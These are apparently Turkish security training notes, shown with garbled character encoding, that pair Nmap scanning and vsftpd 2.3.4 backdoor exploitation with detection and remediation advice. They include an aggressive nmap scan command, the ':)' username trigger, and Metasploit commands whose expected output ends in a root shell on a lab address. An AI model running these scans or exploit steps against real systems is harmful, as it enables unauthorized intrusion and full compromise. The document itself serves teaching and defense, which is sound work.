# Nmap ile AÄŸ KeÅŸfi ve Defansif Analiz

Bu dokÃ¼man, aÄŸ haritalama aracÄ± **Nmap**'in saldÄ±rganlar (Red Team) tarafÄ±ndan nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± ve savunmacÄ±larÄ±n (Blue Team) bu taramalarÄ± nasÄ±l tespit edip analiz edebileceÄŸini aÃ§Ä±klar.

## 1. Nmap Ã‡alÄ±ÅŸma MantÄ±ÄŸÄ± ve Taramalar
Nmap, hedef sistemlere Ã¶zel hazÄ±rlanmÄ±ÅŸ TCP/IP paketleri gÃ¶nderir ve dÃ¶nen cevaplarÄ± (veya cevapsÄ±zlÄ±klarÄ±) analiz ederek sistem hakkÄ±nda bilgi toplar.

### YaygÄ±n Tarama Teknikleri ve DÃ¼zeltmeler
Notlarda geÃ§en parametrelerin doÄŸru teknik aÃ§Ä±klamalarÄ± ÅŸÃ¶yledir:

* **-sS (TCP SYN Scan):** "YarÄ± aÃ§Ä±k" (Half-open) tarama olarak bilinir. SaldÄ±rgan, hedefle tam bir baÄŸlantÄ± kurmaz (3-way handshake tamamlanmaz).
    * *Neden Tehlikeli?* BaÄŸlantÄ± tamamlanmadÄ±ÄŸÄ± iÃ§in bazÄ± basit log sistemlerinde iz bÄ±rakmayabilir.
* **-sT (TCP Connect Scan):** Hedefle tam baÄŸlantÄ± kurulur. GÃ¼rÃ¼ltÃ¼lÃ¼dÃ¼r ve loglarda kolayca gÃ¶rÃ¼lÃ¼r.
* **-sU (UDP Scan):** DNS, SNMP gibi UDP servislerini tarar. Genelde daha yavaÅŸtÄ±r.
* **-Pn:** Ping atmadan tarama yapar. Hedefin Firewall'u ICMP (Ping) paketlerini engelliyorsa, sunucunun ayakta olduÄŸunu varsayarak taramaya zorlar.

### Servis ve Versiyon KeÅŸfi (-sV vs -A)
* **-sV:** Sadece portta Ã§alÄ±ÅŸan servisin versiyonunu (Ã–rn: Apache 2.4.49) anlamaya Ã§alÄ±ÅŸÄ±r.
* **-A (Aggressive Scan):** Ã‡ok daha kapsamlÄ±dÄ±r. Ä°ÅŸletim sistemi tespiti (`-O`), Versiyon taramasÄ± (`-sV`), Script taramasÄ± (`-sC`) ve Traceroute iÅŸlemini aynÄ± anda yapar.
    * *Analist Notu:* Bir saldÄ±rgan `-A` kullanÄ±yorsa aÄŸ trafiÄŸinde Ã§ok bÃ¼yÃ¼k bir imza (gÃ¼rÃ¼ltÃ¼) bÄ±rakÄ±r, tespiti en kolay taramalardan biridir.

### Ã–rnek SaldÄ±rÄ± Senaryosu
SaldÄ±rganÄ±n hÄ±zlÄ± ve detaylÄ± bir tarama yapmak iÃ§in kullandÄ±ÄŸÄ± optimize edilmiÅŸ komut:

```bash
# -T4: HÄ±zlÄ± tarama (Timing template)
# -v: Verbose (DetaylÄ± Ã§Ä±ktÄ± verir)
nmap -v -sS -A -T4 10.0.2.5
```
ğŸ›¡ï¸ Blue Team: Tespit ve MÃ¼dahale
Bir aÄŸ analisti olarak Nmap taramalarÄ±nÄ± tespit etmek iÃ§in aÅŸaÄŸÄ±daki yÃ¶ntemler kullanÄ±lÄ±r.

1. IDS/IPS Ä°mzalarÄ± (Snort/Suricata)
SaldÄ±rganlar -T4 veya -T5 gibi agresif hÄ±z modlarÄ±nÄ± kullandÄ±ÄŸÄ±nda, kÄ±sa sÃ¼rede binlerce paket Ã¼retirler.

Tespit Stratejisi:
  * SYN Flood BenzerliÄŸi: Tek bir IP adresinden, aÄŸdaki birÃ§ok farklÄ± porta saniyeler iÃ§inde yÃ¼zlerce SYN bayraklÄ± paket geliyorsa bu bir Port TaramasÄ±dÄ±r (Port Scanning).
  * User-Agent KontrolÃ¼: Nmap, bazÄ± script taramalarÄ±nda (-sC) HTTP isteklerinde User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; ...) bilgisini sÄ±zdÄ±rabilir. Web sunucu loglarÄ±nda bu "Nmap" kelimesi aranmalÄ±dÄ±r.

2. Log Analizi ve Korelasyon
  * Firewall LoglarÄ±: "DENY" veya "DROP" ile sonuÃ§lanan ardÄ±ÅŸÄ±k baÄŸlantÄ± istekleri incelenmelidir. Hedef 10.0.2.5 IP'sine 100 farklÄ± porttan istek gelmiÅŸse, bu bir keÅŸif giriÅŸimidir.

---

### Dosya 2: vsftpd 2.3.4 Backdoor Analizi (Teknik Derinlik EklenmiÅŸ)

*Not: Senin notlarÄ±nda bu zafiyetin sadece "gÃ¼ncellenmemiÅŸ sÃ¼rÃ¼m" olduÄŸu yazÄ±yordu. AslÄ±nda bu, kaynak koduna bilerek yerleÅŸtirilmiÅŸ kÃ¶tÃ¼ niyetli bir arka kapÄ±dÄ±r. AÅŸaÄŸÄ±daki aÃ§Ä±klamayÄ± buna gÃ¶re dÃ¼zelttim.*


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# vsftpd 2.3.4 Backdoor: Analiz ve SÃ¶mÃ¼rÃ¼

Bu dokÃ¼man, **vsftpd 2.3.4** sÃ¼rÃ¼mÃ¼nde bulunan ve **CVE-2011-2523** olarak bilinen kritik arka kapÄ± (backdoor) zafiyetini inceler.

## 1. Zafiyetin Teknik DetayÄ± (KÃ¶k Neden)
Bu zafiyet, sÄ±radan bir kodlama hatasÄ± deÄŸildir. 2011 yÄ±lÄ±nda vsftpd'nin kaynak kod sunucularÄ±na sÄ±zan bir saldÄ±rgan, `str.c` dosyasÄ±na kÃ¶tÃ¼ niyetli bir kod bloÄŸu eklemiÅŸtir.
  * **Tetikleyici (Trigger):** Kod iÃ§erisindeki yapÄ±, kullanÄ±cÄ± adÄ± (username) girilirken `:)` (gÃ¼lÃ¼cÃ¼k) karakterlerinin kullanÄ±lÄ±p kullanÄ±lmadÄ±ÄŸÄ±nÄ± kontrol eder.
  * **SonuÃ§:** EÄŸer kullanÄ±cÄ± adÄ±nda `:)` varsa (Ã–rn: `USER hacker:)`), sistem **TCP 6200** portunu dinlemeye baÅŸlar ve bu porta baÄŸlanan herkese **root** yetkisinde shell (komut satÄ±rÄ±) verir.

## 2. Red Team: SÃ¶mÃ¼rÃ¼ (Exploitation)
  * SaldÄ±rganlar bu zafiyeti Metasploit Framework kullanarak veya manuel olarak tetikleyebilir.

### Metasploit ile SÃ¶mÃ¼rÃ¼ AdÄ±mlarÄ±
```bash
# 1. ModÃ¼lÃ¼ seÃ§
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 2. Hedefi belirle
msf6 exploit(...) > set RHOSTS 10.0.2.5

# 3. SaldÄ±rÄ±yÄ± baÅŸlat
msf6 exploit(...) > exploit
```
Beklenen Ã‡Ä±ktÄ±:
[+] 10.0.2.5:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
SaldÄ±rgan artÄ±k sistemde en yetkili kullanÄ±cÄ±dÄ±r.


ğŸ›¡ï¸ Blue Team: Savunma ve Olay MÃ¼dahalesi
Bu spesifik saldÄ±rÄ±, aÄŸ trafiÄŸinde Ã§ok belirgin izler bÄ±rakÄ±r.

1. AÄŸ TabanlÄ± Tespit (Network Detection)
SaldÄ±rÄ±yÄ± tespit etmek iÃ§in en kritik gÃ¶sterge TCP 6200 portudur. FTP servisi normalde 21. portu kullanÄ±r.
  * Kural: EÄŸer FTP sunucusu (Port 21) ile bir iletiÅŸimden hemen sonra, aynÄ± sunucuda Port 6200 Ã¼zerinden bir trafik baÅŸlÄ±yorsa, vsftpd backdoor tetiklenmiÅŸ demektir.
  * Deep Packet Inspection (DPI): FTP trafiÄŸi ÅŸifresizdir (clear-text). AÄŸ paketlerinde USER komutunun yanÄ±nda :) karakter dizisi (hex: 3A 29) aranmalÄ±dÄ±r.

2. Log Analizi
* Sunucu loglarÄ±nda (/var/log/vsftpd.log veya syslog) baÅŸarÄ±sÄ±z giriÅŸ denemeleri arasÄ±nda garip karakterler iÃ§eren kullanÄ±cÄ± adlarÄ± aranmalÄ±dÄ±r.

3. Ä°yileÅŸtirme (Remediation)
  * Yama (Patch): vsftpd servisi derhal gÃ¼ncel sÃ¼rÃ¼me yÃ¼kseltilmelidir.
  * KonfigÃ¼rasyon: vsftpd.conf dosyasÄ±nda anonymous_enable=NO yapÄ±larak isimsiz giriÅŸler kapatÄ±lmalÄ±dÄ±r, ancak bu backdoor iÃ§in asÄ±l Ã§Ã¶zÃ¼m yazÄ±lÄ±mÄ± gÃ¼ncellemektir.
